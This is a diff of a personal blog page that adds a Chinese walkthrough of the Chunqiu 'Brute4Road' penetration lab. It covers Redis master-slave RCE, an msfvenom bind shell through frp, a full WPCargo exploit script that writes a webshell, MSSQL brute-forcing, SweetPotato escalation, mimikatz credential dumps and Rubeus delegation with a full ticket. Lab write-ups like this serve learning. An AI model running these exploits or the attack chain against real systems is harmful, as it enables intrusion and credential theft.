@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="zh-CN">
-    <meta name="description" content="!!历时半天成功搭建!!">
+    <meta name="keywords" content="春秋靶场-Brute4Road-WP, zh-CN">
+    <meta name="description" content="一次靶场渗透">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>yyb的博客</title>
+    <title>春秋靶场-Brute4Road-WP | yyb的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -334,12 +334,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">春秋靶场-Brute4Road-WP</h1>
                 </div>
             </div>
         </div>
@@ -375,28 +375,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-03-19
+                    2025-07-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-19
+                    2025-07-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    8
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    10 分
                 </div>
                 
 
@@ -416,7 +416,248 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="历时半天成功搭建"><a href="#历时半天成功搭建" class="headerlink" title="!!历时半天成功搭建!!"></a>!!历时半天成功搭建!!</h1>
+                <p>[toc]</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>题目给了一个ip <code>39.99.147.150</code> 先扫一下端口</p>
+<h3 id="端口开放"><a href="#端口开放" class="headerlink" title="端口开放"></a>端口开放</h3><p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507200919424.png" alt="image-20250720091935384"></p>
+<p>扫出来一个80 一个redis</p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>尝试redis未授权</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507200943951.png" alt="image-20250720094341894"></p>
+<p>可以看到，当前版本是5.0.12，尝试主从复制getshell</p>
+<p>我使用的是<code>Redis Rogue Server</code></p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210942079.png" alt="image-20250721094256000"></p>
+<p>另一个端口开监听，使用python开个终端</p>
+<pre class=" language-highlight bash">python -c <span class="string"><code class="language-highlight bash">python -c <span class="string">&#x27;import pty; pty.spawn("/bin/bash")&#x27;</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210944645.png" alt="image-20250721094403618"></p>
+<p>找到flag，但是权限不够</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210946217.png" alt="image-20250721094623187"></p>
+<p>尝试提权<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210947368.png" alt="image-20250721094736337"></p>
+<p>这里使用base64读取flag，成功拿下flag1</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210949073.png" alt="image-20250721094916044"></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>接下来就是横移，ifconfig不能用，查看网卡信息</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210951100.png" alt="image-20250721095117066"></p>
+<p>本机在172.22.2网段，上传扫描工具准备开扫</p>
+<p>使用wget传fscan</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211010546.png" alt="image-20250721101001516"></p>
+<p>开扫</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">[2.8s] [*] 目标 172.22.2.16     存活 (ICMP)
+[2.9s] [*] 目标 172.22.2.18     存活 (ICMP)
+[4.9s] [*] 目标 172.22.2.3      存活 (ICMP)
+[4.9s] [*] 目标 172.22.2.34     存活 (ICMP)
+[5.9s] [*] 目标 172.22.2.7      存活 (ICMP)
+[7.8s]     存活主机数量: 5
+[7.8s]     有效端口数量: 233
+[7.8s] [*] 端口开放 172.22.2.18:80
+[7.8s] [*] 端口开放 172.22.2.16:1433
+[7.8s] [*] 端口开放 172.22.2.18:22
+[7.8s] [*] 端口开放 172.22.2.16:445
+[7.8s] [*] 端口开放 172.22.2.16:139
+[7.8s] [*] 端口开放 172.22.2.16:135
+[7.8s] [*] 端口开放 172.22.2.16:80
+[7.8s] [*] 端口开放 172.22.2.3:445
+[7.8s] [*] 端口开放 172.22.2.3:389
+[7.8s] [*] 端口开放 172.22.2.3:139
+[7.8s] [*] 端口开放 172.22.2.3:135
+[7.8s] [*] 端口开放 172.22.2.3:88
+[7.8s] [*] 端口开放 172.22.2.34:139
+[7.8s] [*] 端口开放 172.22.2.34:445
+[7.8s] [*] 端口开放 172.22.2.34:135
+[7.8s] [*] 端口开放 172.22.2.18:445
+[7.8s] [*] 端口开放 172.22.2.18:139
+[7.8s] [*] 端口开放 172.22.2.7:6379
+[7.8s] [*] 端口开放 172.22.2.7:80
+[7.8s] [*] 端口开放 172.22.2.7:22
+[7.8s] [*] 端口开放 172.22.2.7:21
+[10.8s]     扫描完成, 发现 21 个开放端口
+[10.8s]     存活端口数量: 21
+[10.8s]     开始漏洞扫描
+[10.8s] [*] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
+[10.9s] [+] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable
+[10.9s] [*] NetInfo 扫描结果
+目标主机: 172.22.2.34
+主机名: CLIENT01
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.34
+[10.9s] [*] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS
+[11.0s] [*] NetInfo 扫描结果
+目标主机: 172.22.2.3
+主机名: DC
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.3
+[11.0s] [*] NetInfo 扫描结果
+目标主机: 172.22.2.16
+主机名: MSSQLSERVER
+发现的网络接口:
+   IPv4地址:
+      └─ 172.22.2.16
+[11.0s] [+] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
+[11.0s]     系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]
+[11.0s] [+] NetBios 172.22.2.34     XIAORANG\CLIENT01             
+[11.0s]     系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]
+[11.0s] [+] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
+[11.0s]     POC加载完成: 总共387个，成功387个，失败0个
+[11.0s] [+] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
+[11.0s] [+] SMB认证成功 172.22.2.18:445 administrator:123456
+[11.1s] [+] FTP服务 172.22.2.7:21 匿名登录成功!
+[11.4s]     SMB2共享信息 172.22.2.18:445 administrator Pass:P@ssword123 共享:[print$ IPC$]
+[11.4s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass123 共享:[print$ IPC$]
+[11.4s]     SMB2共享信息 172.22.2.18:445 administrator Pass:root 共享:[print$ IPC$]
+[11.5s] [+] SMB认证成功 172.22.2.16:445 admin:root
+[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]
+[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass: 共享:[print$ IPC$]
+[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin123 共享:[print$ IPC$]
+[11.5s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass@123 共享:[print$ IPC$]
+[11.6s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin 共享:[print$ IPC$]
+[11.7s]     SMB2共享信息 172.22.2.18:445 administrator Pass:Password 共享:[print$ IPC$]
+[11.8s]     SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]
+[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass:password 共享:[print$ IPC$]
+[12.0s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin 共享:[ADMIN$ C$ fileshare IPC$]
+[12.0s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin123 共享:[ADMIN$ C$ fileshare IPC$]
+[12.0s]     SMB2共享信息 172.22.2.16:445 admin Pass:root 共享:[ADMIN$ C$ fileshare IPC$]
+[15.4s] [*] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
+[55.3s]     扫描已完成: 37/37</code></pre>
+
+<p>我们先挂个代理，然后使用msf连接shell</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211047250.png" alt="image-20250721104722212"></p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">┌────────┐        ┌────────────┐        ┌──────────────┐
+│ Kali   │ <--->  │ VPS 	   │ <--->  │   目标机器     │
+└────────┘        └────────────┘        └──────────────┘
+        proxychains         frp（中转）        目标内网资源
+</code></pre>
+
+<p>先使用msf生成shell马</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">msfvenom -p linux/x64/shell/bind_tcp -f elf -o shell.elf</code></pre>
+
+<p>然后在目标机器上传frpc和刚才生成的马。 </p>
+<p>目标机器运行</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">nohup ./frpc -c  frpc.ini & 
+./shell.elf</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211117922.png" alt="image-20250721111752893"></p>
+<p>在自己的vps上运行</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./frps -c frps.ini</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211120986.png" alt="image-20250721112050957"></p>
+<p>最后在kail上运行</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
+use exploit/multi/handler
+set payload linux/x64/shell/bind_tcp
+set rhost 172.22.2.7
+run</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211122685.png" alt="image-20250721112214652"></p>
+<p>成功连接shell</p>
+<p>然后看一下我们扫描出来的ip，总结一下</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">172.22.2.7  本机
+172.22.2.18 WordPress站点
+172.22.2.3  DC
+172.22.2.16 MSSQLSERVER 
+172.22.2.34 远程桌面服务未启用 NLA 的主机</code></pre>
+
+<p>访问wordpress</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211128214.png" alt="image-20250721112813158"></p>
+<p>代理已经成功挂上，使用别的扫描工具进行漏扫，这里使用的是wpscan</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211133941.png" alt="image-20250721113327907"></p>
+<p>这里显示版本为六点几，使用WPCargo &lt; 6.9.0的RCE漏洞，poc：</p>
+<pre class=" language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> sys
+<span class="keyword">import</span> binascii
+<span class="keyword">import</span> requests
+ 
+<span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span>
+<span class="comment"># algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file</span>
+payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span>
+ 
+<span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):
+    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)
+ 
+text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]
+ 
+destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span>
+cmd = <span class="string">&#x27;ls&#x27;</span>
+ 
+<span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span>
+requests.get(
+    <span class="string">f"<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"</span>
+)
+ 
+<span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span>
+<span class="built_in">print</span>(requests.post(
+    <span class="string">f"<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system"</span>, data=&#123;<span class="string">"2"</span>: cmd&#125;
+).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211135850.png" alt="image-20250721113551773"></p>
+<p>写入webshell，使用蚁剑连接，咱们先给蚁剑配置代理</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211430520.png" alt="image-20250721143003457"></p>
+<p>然后连接webshell</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211432986.png" alt="image-20250721143237949"></p>
+<p>我们可以在其配置文件中找到数据库的账号密码</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">wpuser/WpuserEha8Fgj9</code></pre>
+
+<p>直接在蚁剑处连接数据库（注意，这里host一定要写localhost，写它主机ip数据库会出错）</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211444602.png" alt="image-20250721144441551"></p>
+<p>然后就能看到flag，点击查询就得到flag2了</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211445998.png" alt="image-20250721144550960"></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>然后在当前flag数据库中有一个秘密的表，查询一下发现是一堆密码，然后把密码全都导出来，一共好几百个呢，记得查询时删除后面的限制。</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211531844.png" alt="image-20250721153157785"></p>
+<p>还记得我们刚开始fscan扫出来的信息吗，在<code>172.22.2.16</code>ip开放了1433端口，这是个mssql数据库，尝试爆破密码，就用我们导出来的密码本</p>
+<p>使用msf爆破</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 172.22.2.16
+set user_file /root/Desktop/user.txt 
+set pass_file /root/Desktop/pass.txt</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211539174.png" alt="image-20250721153921142"></p>
+<p>然后成功爆破出管理员的密码 sa&#x2F;ElGNkOiC</p>
+<p>使用MDUT连接，因为我前面在vps上挂了代理，这里直接调用就好了</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">
+E:\bili_download\Multiple.Database.Utilization.Tools-2.1.1>E:\java8\bin\java.exe -DsocksProxyHost=vps的IP -DsocksProxyPort=6000 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211625532.png" alt="image-20250721162538467"></p>
+<p>然后成功连接，命令执行</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211626299.png" alt="image-20250721162605268"></p>
+<p>当前用户权限很低，尝试提权，我感觉可以连cs用插件提权很快，不过我懒，直接sweetpotato提权</p>
+<p>传文件之前记得激活组件</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211636510.png" alt="image-20250721163616470"></p>
+<p>成功提到system权限，找flag（一般都喜欢放在桌面）</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211640157.png" alt="image-20250721164036114"></p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>然后3389连接</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211641432.png" alt="image-20250721164158379"></p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">net user yyb Admin@123 /add
+net localgroup administrators yyb /add</code></pre>
+
+<p>然后我是挂的proxifier代理在本机连接的</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211712498.png" alt="image-20250721171237146"></p>
+<p>连接成功，密码记得搞复杂一点点，要不然连不上</p>
+<p>ipconfig &#x2F;all发现域环境</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211724711.png" alt="image-20250721172444668"></p>
+<p>传mimikatz然后抓密码</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">privilege::debug
+sekurlsa::logonpasswords</code></pre>
+
+<p>成功抓到一个域用户的哈希</p>
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211728210.png" alt="image-20250721172849175"></p>
+<p>只找到一个域用户，那就没有什么能用的，尝试委派攻击</p>
+<p>传rubeus搞一个TGT票据</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f414d4a5879e2b18dff531d85236b214 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > 1.txt</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211732729.png" alt="image-20250721173242678"></p>
+<p>然后把票据注入内存</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3D1qJxagrnyNB6lRLLLimOvJSWEFk5QwMdTe88MQzI6GSIrsq6xnWWn5qFKWEOcynwoFlBWPce1uzZ1vqhn0ytxUwse5y47oDaBrVgdkTJGD8MmRRtp8ih2arsBsmeJ1MxWa/T/gt14kG6MhwRAKuzgOFA+KAz3Yvg56FDEQk4m/ApPnbvafBZnZ4x9OJfRFY2MY7lzMNzi+XoHCO62FMx7lqkW2agd3gNO3FCyBMKyZUsf/o5hj/pJ1jb5xHesGS5nPP9ljpquFqfzJhQoSDR2RZwF2mZV586BsCbAKgeulb6rOoEXSaXv1zDEiELDarVJ46OZXtGvIq8dzZz2NFWOMi2kCQN2jRUTGZf3C1QrnBa41XC7IkQyj/m25ZS+fAzjbDWC2VU4x1lY7Goizi4zyzI6wBnrtJsOpARztofMCxplHD9GO8Wxxobk9amVAVrHz+0MMpPkUajgVbPyyTbnGcCLGe+4iJNomDJ1M1VO1uKZsWqlwYJB9W84yyl5wNxh2r+2enOoHdRwHYtN0VygvmPXisgW87ypnWk1z62qi4mQgtbHSqn37CkewUoh8aRayxA/FHEtX3OExCvqUC1EwatgxFvpAyFCkYQrZVcaVy22FNKNUsLSAXRU+PdGMZVsyPX8g8nNMaG6HGjITJFd9JUtEBEzT6MNDOlwcmHWWtFrh45tbyZ6Tb3eoZfDG+ePaAN/1KHt/z0uogbsUbBVxBFEJ7jMFKGo9tJ9F/i5TZmu18XrHK+YTA5RCaQbpqGHL5ZestM1qASOMt/U9a0jFJ7Qc3UH5xpmEG/gJGy0bvwrq/5DmxlPwns51FxyHnpV2/2ivoG8KlhDQ+7ZsReeDR/Yx4b/ltm78MFb3sYDNoZNRmIkmtlUr/hhtgjxAml5mSmYHuK2a7LDo5EKLhwQvVwfi655EP/8XpeAOwOX214xR7xx3ytXIjP0H4TfCdB3/M53aEIGDyewiDdSdoZSTXCT1uzbXhzYEorSZTjvyj5/c569lpzZANm+pu9wxqEZR3KuR6M6Gua5JOXvB7zTMVziO6432zM/QylaUQTTIvVB6ho0s1LYAlhrzm9CDSN0qbxSKNMRyk9cY6LBLhMk/QyhH21W7v26NaxlyOPZiG/2iXPXghieZUyuj41N4U+OjeIZFQapqhNgVicCp1XZ2u5r+DXWGqEaAf6zmRtGpT/c6XI7e+eM2PQV34QppPU+yxmjIDZcYwfrHV4QEZHoTFBY37YkqnVZ0AvfMVm6nCUXjtz3Zfairq5vONGmMsrU8r/G1Ezy63zpbsb7WpRV0MgJW8jp1Bhb1w3RjENHaRhffHf77DSYrG5sbW9Y6q9/tX5dafNz0f4Sjs+cky8LtVebObTBYX5VSmme4QxvRdnN6FfDJKS53WkediaLcoMMZZclW3imwJ29fPVIYd3s83/HANG+csokt1PcdaUYm4EZ2bF+0Orog5xGqCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB53vQ2rhdsQEfSvz0rI5SHoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDcyMTA5MzIxNVqmERgPMjAyNTA3MjExOTMyMTVapxEYDzIwMjUwNzI4MDkzMjE1WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211734118.png" alt="image-20250721173414070"></p>
+<p>成功导入，尝试访问域控</p>
+<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211738984.png" alt="image-20250721173812952"></p>
+<p>成功拿下flag4</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要这个入口机的redis主从复制很恶心，我拿到shell之后挂代理跑脚本什么的，只要卡住就只能重启环境。</p>
+<p>菜菜，有问题欢迎批评指正</p>
+
                 
             </div>
             <hr/>
@@ -442,7 +683,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yyb0666.github.io/2025/03/19/my-first-blog/">https://yyb0666.github.io/2025/03/19/my-first-blog/</a>
+                    <a href="https://yyb0666.github.io/2025/07/21/chun-qiu-ba-chang-brute4road-wp/">https://yyb0666.github.io/2025/07/21/chun-qiu-ba-chang-brute4road-wp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -556,9 +797,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/07/21/chun-qiu-ba-chang-brute4road-wp/">
                     <div class="card-image">
@@ -576,9 +818,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-07-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -587,6 +829,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -594,7 +837,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2025/03/19/my-first-blog/">
@@ -624,7 +867,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
